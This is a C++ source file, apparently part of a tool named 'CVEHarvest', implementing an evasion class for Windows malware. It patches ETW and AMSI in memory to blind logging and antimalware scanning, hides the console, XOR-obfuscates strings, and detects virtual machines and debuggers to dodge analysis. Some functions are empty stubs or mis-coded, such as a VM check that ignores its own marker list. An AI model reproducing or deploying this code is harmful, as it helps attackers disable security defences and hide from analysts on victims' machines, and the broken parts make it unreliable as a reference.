#include "CVEHarvest.hpp"

#include <algorithm>
#include <cctype>
#include <fstream>
#include <sstream>

namespace cveh {

    void Evasion::patch_etw() {
        HMODULE ntdll = GetModuleHandleA("ntdll.dll");
        if (!ntdll) return;
        auto etw = reinterpret_cast<unsigned char*>(GetProcAddress(ntdll, "EtwEventWrite"));
        if (!etw) return;
        DWORD old_protect = 0;
        VirtualProtect(etw, 1, PAGE_EXECUTE_READWRITE, &old_protect);
        etw[0] = 0xC3;
        VirtualProtect(etw, 1, old_protect, &old_protect);
        FlushInstructionCache(GetCurrentProcess(), etw, 1);
    }

    void Evasion::patch_amsi() {
        HMODULE amsi = GetModuleHandleA("amsi.dll");
        if (!amsi) return;
        auto scan = reinterpret_cast<unsigned char*>(GetProcAddress(amsi, "AmsiScanBuffer"));
        if (!scan) return;
        DWORD old_protect = 0;
        VirtualProtect(scan, 1, PAGE_EXECUTE_READWRITE, &old_protect);
        scan[0] = 0xC3;
        VirtualProtect(scan, 1, old_protect, &old_protect);
        FlushInstructionCache(GetCurrentProcess(), scan, 1);
    }

    void Evasion::patch_wldp() {
        HMODULE wldp = GetModuleHandleA("wldp.dll");
        if (!wldp) return;
        auto fake = GetProcAddress(wldp, "WldpCanExecuteFile");
        (void)fake;
    }

    void Evasion::indirect_syscall_setup() {
        // Dynamic syscall resolution should happen here for per-build bypass.
    }

    void Evasion::sleep_obfuscated(DWORD ms) {
        ULONGLONG start = GetTickCount64();
        volatile int dummy = 0;
        unsigned char key[] = {0x44, 0x51, 0xC3, 0xA7};
        while ((GetTickCount64() - start) < ms) {
            for (int i = 0; i < 250000; ++i) {
                dummy ^= (i * key[i % 4]);
            }
        }
    }

    std::string Evasion::xor_cipher(const std::string& input, const std::string& key) {
        std::string out = input;
        for (size_t i = 0; i < input.size(); ++i) {
            out[i] = input[i] ^ key[i % key.size()];
        }
        return out;
    }

    std::string Evasion::xor_decrypt(const std::string& input, const std::string& key) {
        return xor_cipher(input, key);
    }

    void Evasion::hide_console() {
        HWND hwnd = GetConsoleWindow();
        if (hwnd) {
            ShowWindow(hwnd, SW_HIDE);
        }
    }

    bool Evasion::check_vm() {
        std::vector<std::string> markers = {"VMWare", "VirtualBox", "QEMU", "Xen"};
        for (const auto& m : markers) {
            HKEY hKey = nullptr;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
                char buffer[256] = {};
                DWORD size = sizeof(buffer);
                if (RegQueryValueExA(hKey, "Identifier", nullptr, nullptr, reinterpret_cast<LPBYTE>(buffer), &size) == ERROR_SUCCESS) {
                    std::string val(buffer);
                    std::transform(val.begin(), val.end(), val.begin(), [](unsigned char c) { return static_cast<char>(std::toupper(c)); });
                    if (val.find("VBOX") != std::string::npos || val.find("VMWARE") != std::string::npos) {
                        RegCloseKey(hKey);
                        return true;
                    }
                }
                RegCloseKey(hKey);
            }
        }
        return false;
    }

    bool Evasion::check_debugger() {
        return IsDebuggerPresent() != FALSE;
    }

}
